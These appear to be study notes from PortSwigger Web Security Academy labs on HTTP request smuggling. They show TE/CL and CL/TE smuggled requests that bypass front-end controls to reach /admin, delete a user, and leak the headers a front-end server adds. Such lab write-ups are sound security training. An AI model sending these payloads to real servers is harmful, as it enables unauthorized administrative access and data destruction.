## Using HTTP request smuggling to bypass front-end security controls

TE/CL:

<mark class="hltr-b">POST /home HTTP/1.1</mark>
<mark class="hltr-b">Host: vulnerable-website.com</mark>
<mark class="hltr-b">Content-Type: application/x-www-form-urlencoded</mark>
<mark class="hltr-b">Content-Length: 62</mark>
<mark class="hltr-b">Transfer-Encoding: chunked</mark>

<mark class="hltr-b">0</mark>

<mark class="hltr-r">GET /admin HTTP/1.1</mark>
<mark class="hltr-r">Host: vulnerable-website.com</mark>
<mark class="hltr-r">Foo: x</mark><mark class="hltr-g">GET /home HTTP/1.1</mark>
<mark class="hltr-g">Host: vulnerable-website.com</mark>

The front-end server see two requests, both for `/home`. Backend sees one request for `/home` and one for `/admin`. As they have passed through the front-end controls, and so grant access to the restricted URL.

Example CL/TE:
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

## Revealing front-end request rewriting
For example, the front-end server might:
- terminate the TLS connection and add some headers describing the protocol and ciphers that were used;
- add an `X-Forwarded-For` header containing the user's IP address;
- determine the user's ID based on their session token and add a header identifying the user; or
- add some sensitive information that is of interest for other attacks.

There is often a simple way to reveal exactly how the front-end server is rewriting requests. To do this, you need to perform the following steps:

- Find a POST request that reflects the value of a request parameter into the application's response.
- Shuffle the parameters so that the reflected parameter appears last in the message body.
- Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal.

Suppose an application has a login function that reflects the value of the `email` parameter:
```http
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
```
response:
```html
<input id="email" value="wiener@normal-user.net" type="text">
```

**RS CL/TE:**
<mark class="hltr-b">POST / HTTP/1.1</mark>
<mark class="hltr-b">Host: vulnerable-website.com</mark>
<mark class="hltr-b">Content-Length: 130</mark>
<mark class="hltr-b">Transfer-Encoding: chunked</mark>

<mark class="hltr-b">0</mark>

<mark class="hltr-o">POST /login HTTP/1.1</mark>
<mark class="hltr-o">Host: vulnerable-website.com</mark>
<mark class="hltr-o">Content-Type: application/x-www-form-urlencoded</mark>
<mark class="hltr-o">Content-Length: 100</mark>

<mark class="hltr-o">email=</mark><mark class="hltr-g">POST /login HTTP/1.1</mark>
<mark class="hltr-g">Host: vulnerable-website.com</mark>
<mark class="hltr-g">...</mark>
**Response:**
```
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...
```
Complete example:
```http
POST / HTTP/1.1
Host: 0a120055047deebbb9562bdc00b10074.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```
Get header name in the response and perform attack request:
```http
POST / HTTP/1.1
Host: 0a120055047deebbb9562bdc00b10074.web-security-academy.net
Content-Length: 170
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-sGquJt-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1


```

## Bypassing client authentication
#to-be-continued 
https://portswigger.net/web-security/request-smuggling/exploiting